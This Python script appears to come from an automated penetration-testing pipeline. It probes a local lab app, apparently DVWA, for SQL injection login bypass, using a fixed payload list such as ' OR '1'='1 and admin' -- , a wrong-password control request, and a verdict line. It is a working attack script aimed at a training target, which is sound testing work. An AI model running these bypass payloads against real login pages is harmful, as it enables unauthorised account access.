#!/usr/bin/env python3
"""explore_authbypass.py — NEW PROCESS (brain-explore-v1, 29 Oct ~19:57 IST).

WHY THIS PROCESS EXISTS (reason, owner refinement #1): the playbook's SQLi
UNION dump proved the /vulnerabilities/sqli/ module is injectable. A real
elite hunter's next thought is: "if SQL is injectable there, is the AUTH
layer itself injectable?" — try to log in WITHOUT the password via classic
SQLi auth-bypass payloads on /login.php and /vulnerabilities/brute/.

Self-contained: fixed payload set, own control request, fixed VERDICT line
LAST (engine VERDICT_RE). Marker not needed — no injection echo is claimed;
the signal is "Welcome" without knowing the password.
"""
import sys
import urllib.parse
import urllib.request

BASE = "http://172.17.0.1:3100"
TIMEOUT = 25

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "admin' -- ",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
]


def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:  # fail-closed: transport errors are probe output
        return f"TRANSPORT_ERROR: {e}"


def try_login(path, user, pw):
    body = post(path, {"username": user, "password": pw, "Login": "Login"})
    return "Welcome" in body, body


print("AUTHBYPASS-EXPLORE-START base=%s" % BASE)

# CONTROL: wrong password must NOT log in (proves the oracle means something).
ok_ctrl, _ = try_login("/login.php", "admin", "definitely-wrong-pw-7719")
print("CONTROL wrong-pw login Welcome=%s (expect False)" % ok_ctrl)

bypassed = []
for payload in PAYLOADS:
    for path in ("/login.php", "/vulnerabilities/brute/"):
        ok, body = try_login(path, "admin", payload)
        print("TRY path=%s payload=%r -> Welcome=%s" % (path, payload, ok))
        if ok:
            bypassed.append((path, payload))
            break
    if bypassed:
        break

if not ok_ctrl and not bypassed:
    print("REASON: auth layer rejected all %d SQLi bypass payloads on both "
          "login endpoints while the control (wrong password) also failed — "
          "the auth oracle is sound and NOT injectable in this lab."
          % len(PAYLOADS))
    print("VERDICT: FAILED")
elif bypassed:
    print("EVIDENCE: logged in WITHOUT the password: %s" % (bypassed,))
    print("VERDICT: CONFIRMED")
else:
    print("REASON: control request itself logged in (oracle broken) — "
          "no claim possible on this evidence.")
    print("VERDICT: FAILED")
